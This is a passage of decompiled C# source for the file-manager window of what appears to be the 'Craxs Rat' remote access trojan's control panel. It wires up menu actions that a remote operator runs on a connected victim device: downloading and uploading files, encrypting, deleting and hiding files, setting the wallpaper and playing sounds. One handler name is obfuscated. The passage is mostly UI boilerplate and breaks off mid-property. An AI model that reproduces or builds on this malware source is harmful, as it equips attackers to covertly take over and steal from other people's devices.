using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Craxs_Rat.My;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class FileManager : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ctxMenu")]
	private ContextMenuStrip _ctxMenu;

	[AccessedThroughProperty("DownloadToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _DownloadToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UploadToolStripMenuItem")]
	private ToolStripMenuItem _UploadToolStripMenuItem;

	[AccessedThroughProperty("FolderDownloadsToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _FolderDownloadsToolStripMenuItem;

	[AccessedThroughProperty("EncryptToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _EncryptToolStripMenuItem;

	[AccessedThroughProperty("DecodeToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _DecodeToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	[CompilerGenerated]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("EditToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _EditToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ZipToolStripMenuItem")]
	private ToolStripMenuItem _ZipToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UnZipToolStripMenuItem")]
	private ToolStripMenuItem _UnZipToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RenameToolStripMenuItem")]
	private ToolStripMenuItem _RenameToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HideToolStripMenuItem")]
	private ToolStripMenuItem _HideToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ShowToolStripMenuItem")]
	private ToolStripMenuItem _ShowToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("AddFilesToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _AddFilesToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("OpenToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _OpenToolStripMenuItem;

	[AccessedThroughProperty("TOpacity")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CutToolStripMenuItem")]
	private ToolStripMenuItem _CutToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	[AccessedThroughProperty("PasteToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SetWallpaperToolStripMenuItem")]
	private ToolStripMenuItem _SetWallpaperToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PlaySoundToolStripMenuItem")]
	private ToolStripMenuItem _PlaySoundToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientPic")]
	private PictureBox _ClientPic;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Usrbtry")]
	[CompilerGenerated]
	private PictureBox _Usrbtry;

	[AccessedThroughProperty("Timer2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer _Timer2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viwimage")]
	private PictureBox _viwimage;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("sdbtn")]
	private DrakeUIButtonIcon _sdbtn;

	[AccessedThroughProperty("dcmbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _dcmbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("picbtn")]
	private DrakeUIButtonIcon _picbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	[AccessedThroughProperty("DrakeUIButtonIcon6")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _DrakeUIButtonIcon6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon7")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon7;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon8")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon8;

	[AccessedThroughProperty("DGV0")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIDataGridView _DGV0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("cancelbtn")]
	private DrakeUIButtonIcon _cancelbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearButton")]
	private DrakeUIButtonIcon _ClearButton;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearsrchbtn")]
	private DrakeUIAvatar _clearsrchbtn;

	[AccessedThroughProperty("searchtext")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUITextBox _searchtext;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchbtn")]
	[CompilerGenerated]
	private DrakeUIAvatar _searchbtn;

	[AccessedThroughProperty("Downpic")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _Downpic;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public string ver;

	public int Correntindex;

	public Collection paths_indexs;

	private string FSize;

	private string Q;

	public bool ShowVideo;

	public string DownFolder;

	public Collection DownStreams;

	private string FileDirectory;

	private List<Array> Clipboard;

	private bool isfront;

	private string KEYsx;

	private PictureBox tempImage;

	private List<DataGridViewRow> searchbefore;

	internal virtual ContextMenuStrip ctxMenu
	{
		[CompilerGenerated]
		get
		{
			return _ctxMenu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = ctxMenu_Opening;
			ContextMenuStrip contextMenuStrip = _ctxMenu;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening -= value2;
			}
			_ctxMenu = value;
			contextMenuStrip = _ctxMenu;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DownloadToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DownloadToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DownloadToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DownloadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DownloadToolStripMenuItem = value;
			toolStripMenuItem = _DownloadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem UploadToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _UploadToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = UploadToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _UploadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_UploadToolStripMenuItem = value;
			toolStripMenuItem = _UploadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("FilesUpload")]
	internal virtual OpenFileDialog FilesUpload
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem FolderDownloadsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _FolderDownloadsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = FolderDownloadsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _FolderDownloadsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_FolderDownloadsToolStripMenuItem = value;
			toolStripMenuItem = _FolderDownloadsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem EncryptToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _EncryptToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = EncryptToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _EncryptToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_EncryptToolStripMenuItem = value;
			toolStripMenuItem = _EncryptToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DecodeToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DecodeToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DecodeToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DecodeToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DecodeToolStripMenuItem = value;
			toolStripMenuItem = _DecodeToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DeleteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DeleteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DeleteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DeleteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DeleteToolStripMenuItem = value;
			toolStripMenuItem = _DeleteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem EditToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _EditToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = EditToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _EditToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_EditToolStripMenuItem = value;
			toolStripMenuItem = _EditToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ZipToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ZipToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ZipToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ZipToolStripMenuItem = value;
			toolStripMenuItem = _ZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem UnZipToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _UnZipToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = UnZipToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _UnZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_UnZipToolStripMenuItem = value;
			toolStripMenuItem = _UnZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RenameToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RenameToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RenameToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RenameToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RenameToolStripMenuItem = value;
			toolStripMenuItem = _RenameToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem HideToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _HideToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = HideToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _HideToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_HideToolStripMenuItem = value;
			toolStripMenuItem = _HideToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ShowToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ShowToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ShowToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ShowToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ShowToolStripMenuItem = value;
			toolStripMenuItem = _ShowToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem AddFilesToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AddFilesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = AddFilesToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _AddFilesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_AddFilesToolStripMenuItem = value;
			toolStripMenuItem = _AddFilesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem OpenToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OpenToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OpenToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _OpenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OpenToolStripMenuItem = value;
			toolStripMenuItem = _OpenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CutToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CutToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CutToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CutToolStripMenuItem = value;
			toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CopyToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CopyToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CopyToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CopyToolStripMenuItem = value;
			toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PasteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PasteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PasteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PasteToolStripMenuItem = value;
			toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SetWallpaperToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SetWallpaperToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SetWallpaperToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SetWallpaperToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SetWallpaperToolStripMenuItem = value;
			toolStripMenuItem = _SetWallpaperToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PlaySoundToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PlaySoundToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PlaySoundToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PlaySoundToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PlaySoundToolStripMenuItem = value;
			toolStripMenuItem = _PlaySoundToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ThumbsCont")]
	internal virtual Label ThumbsCont
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DGVDATA")]
	internal virtual DataGridView DGVDATA
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("N")]
	internal virtual DataGridViewTextBoxColumn N
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("P")]
	internal virtual DataGridViewTextBoxColumn P
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("S")]
	internal virtual DataGridViewTextBoxColumn S
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("D")]
	internal virtual DataGridViewTextBoxColumn D
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ST")]
	internal virtual DataGridViewTextBoxColumn ST
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox ClientPic
	{
		[CompilerGenerated]
		get
		{
			return _ClientPic;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClientPic_MouseEnter;
			PictureBox pictureBox = _ClientPic;
			if (pictureBox != null)
			{
				pictureBox.MouseEnter -= value2;
			}
			_ClientPic = value;
			pictureBox = _ClientPic;
			if (pictureBox != null)
			{
				pictureBox.MouseEnter += value2;
			}
		}
	}

	[field: AccessedThroughProperty("usrscreen")]
	internal virtual PictureBox usrscreen
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox Usrbtry
	{
		[CompilerGenerated]
		get
		{
			return _Usrbtry;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Usrbtry_MouseEnter;
			PictureBox pictureBox = _Usrbtry;
			if (pictureBox != null)
			{
				pictureBox.MouseEnter -= value2;
			}
			_Usrbtry = value;
			pictureBox = _Usrbtry;
			if (pictureBox != null)
			{
				pictureBox.MouseEnter += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PB")]
	internal virtual ProgressBar PB
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W1")]
	internal virtual DrakeWidth_W DrakeWidth_W1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsvsdegvdsergef;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("seentext")]
	internal virtual Label seentext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Selecttext")]
	internal virtual Label Selecttext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CountText")]
	internal virtual Label CountText
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clinumb")]
	internal virtual Label clinumb
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox viwimage
	{
		[CompilerGenerated]
		get
		{
			return _viwimage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Viwimage_MouseEnter;
			EventHandler value3 = Viwimage_MouseLeave_1;
			PictureBox pictureBox = _viwimage;
			if (pictureBox != null)
			{
				pictureBox.MouseEnter -= value2;
				pictureBox.MouseLeave -= value3;
			}
			_viwimage = value;
			pictureBox = _viwimage;
			if (pictureBox != null)
			{
				pictureBox.MouseEnter += value2;
				pictureBox.MouseLeave += value3;
			}
		}
	}

	internal virtual DrakeUIButtonIcon sdbtn
	{
		[CompilerGenerated]
		get
		{
			return _sdbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _sdbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_sdbtn = value;
			drakeUIButtonIcon = _sdbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon dcmbtn
	{
		[CompilerGenerated]
		get
		{
			return _dcmbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _dcmbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_dcmbtn = value;
			drakeUIButtonIcon = _dcmbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon picbtn
	{
		[CompilerGenerated]
		get
		{
			return _picbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _picbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_picbtn = value;
			drakeUIButtonIcon = _picbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon5_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon5 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon6
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
